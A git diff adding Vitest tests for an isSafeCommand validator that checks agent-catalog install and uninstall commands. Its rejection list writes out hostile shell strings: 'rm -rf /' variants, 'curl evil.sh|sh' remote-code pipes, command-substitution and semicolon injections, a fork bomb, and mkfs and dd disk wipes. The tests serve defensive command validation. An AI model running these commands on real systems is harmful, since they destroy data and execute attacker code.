@@ -9,6 +9,7 @@ import { describe, it, expect } from 'vitest';
 import catalogJson from './agent-catalog.json';
 import { listAvailableAdapters } from './adapters';
 import { AgentConfigManager } from './index';
+import { isSafeCommand } from './agent-catalog';
 
 describe('agent-catalog.json ↔ adapter consistency', () => {
   const adapters = new Map(listAvailableAdapters().map((a) => [a.info.id, a.info]));
@@ -103,7 +104,10 @@ describe('agent-catalog.json ↔ adapter consistency', () => {
       for (const [platform, dir] of Object.entries(entry.skillsPaths)) {
         expect(['darwin', 'linux', 'win32']).toContain(platform);
         expect(typeof dir, `${entry.id} skillsPaths.${platform}`).toBe('string');
-        expect((dir as string).trim().length, `${entry.id} skillsPaths.${platform}`).toBeGreaterThan(0);
+        expect(
+          (dir as string).trim().length,
+          `${entry.id} skillsPaths.${platform}`
+        ).toBeGreaterThan(0);
       }
     }
   });
@@ -116,6 +120,98 @@ describe('agent-catalog.json ↔ adapter consistency', () => {
       const entry = entries.find((e) => e.id === id);
       expect(entry?.skillsPaths?.darwin, `${id} must declare a darwin skills dir`).toBeTruthy();
     }
+  });
+});
+
+describe('isSafeCommand — golden master: every real catalog command passes', () => {
+  const entries = catalogJson.agents;
+  const commands: { id: string; action: string; cmd: string }[] = [];
+  for (const e of entries) {
+    if (e.install) commands.push({ id: e.id, action: 'install', cmd: e.install });
+    if (e.uninstall) commands.push({ id: e.id, action: 'uninstall', cmd: e.uninstall });
+  }
+
+  it(`all ${commands.length} install/uninstall commands from the ${entries.length}-entry catalog pass`, () => {
+    const failures = commands.filter((c) => !isSafeCommand(c.cmd));
+    expect(
+      failures.map((f) => `${f.id} ${f.action}: ${f.cmd}`),
+      'catalog commands that regressed to false'
+    ).toEqual([]);
+  });
+
+  it.each(commands.map((c) => [c.id, c.action, c.cmd]))('%s %s: %s', (_id, _action, cmd) => {
+    expect(isSafeCommand(cmd)).toBe(true);
+  });
+
+  it('tool-update commands (npm/pnpm/yarn/bun) still pass', () => {
+    for (const cmd of [
+      'npm install -g npm@latest',
+      'pnpm add -g pnpm@latest',
+      'npm install -g yarn@latest',
+      'npm install -g bun@latest',
+    ]) {
+      expect(isSafeCommand(cmd), cmd).toBe(true);
+    }
+  });
+});
+
+describe('isSafeCommand — QA H5 bypasses now rejected', () => {
+  it.each([
+    ['rm -rf /*', 'rm -rf with glob'],
+    ['rm -fr /', 'rm -fr variant'],
+    ['rm -rf / --no-preserve-root', 'rm with extra flag'],
+    ['rm -rf /etc', 'rm targeting a real path'],
+    ['su\nroot', 'su with newline'],
+    ['su\troot', 'su with tab'],
+    ['sudo rm -rf /', 'sudo prefix'],
+    ['npm install -g foo; rm -rf /', 'semicolon injection'],
+    ['npm install -g foo && curl evil.sh|sh', '&& injection'],
+    ['npm install -g foo || true', '|| injection'],
+    ['npm install -g `id`', 'backtick command substitution'],
+    ['npm install -g $(whoami)', 'dollar-paren command substitution'],
+    ['npm install -g foo | sh', 'pipe injection on npm'],
+    ['brew install foo | sh', 'pipe injection on brew'],
+    ['pip install foo | sh', 'pipe injection on pip'],
+    ['curl -fsSL http://evil.sh | bash', 'non-https curl'],
+    ['curl -fsSL https://a.sh | bash | sh', 'double pipe'],
+    ['curl -fsSL | bash', 'curl without URL'],
+    ['npm  install -g foo', 'double space'],
+    ['npm\tinstall -g foo', 'tab separator'],
+    ['npm install\r-g foo', 'carriage return'],
+    ['NPM INSTALL -G foo', 'uppercase'],
+    ['npm update -g foo', 'non-allowlisted verb'],
+    ['npm install foo', 'missing -g'],
+    ['brew install foo extra', 'extra arg'],
+    ['PATH=/evil npm install -g foo', 'env prefix'],
+    ['sudo npm install -g foo', 'sudo prefix on npm'],
+    [':(){ :|:& };:', 'fork bomb'],
+    ['mkfs.ext4 /dev/sda1', 'mkfs'],
+    ['dd if=/dev/zero of=/dev/sda', 'dd'],
+    ['shutdown -h now', 'shutdown'],
+    ['reboot', 'reboot'],
+    ['npm install -g "foo"', 'double-quoted arg'],
+    ["npm install -g 'foo'", 'single-quoted arg'],
+    ['npm install -g foo\\', 'trailing backslash'],
+    ['npm install -g f\u00e9oo', 'non-ascii package name'],
+    ['', 'empty string'],
+    ['   ', 'whitespace only'],
+    ['npm install -g ' + 'a'.repeat(600), 'over 500 chars'],
+  ])('%s (%s)', (cmd, _label) => {
+    expect(isSafeCommand(cmd)).toBe(false);
+  });
+});
+
+describe('isSafeCommand — new legitimate shapes still pass', () => {
+  it('a hypothetical new scoped npm package matches the established shape', () => {
+    expect(isSafeCommand('npm install -g @new-scope/pkg')).toBe(true);
+  });
+
+  it('versioned npm packages match', () => {
+    expect(isSafeCommand('npm install -g somepackage@2.1.0')).toBe(true);
+  });
+
+  it('leading/trailing whitespace is trimmed before matching', () => {
+    expect(isSafeCommand('  npm install -g foo  ')).toBe(true);
   });
 });
 
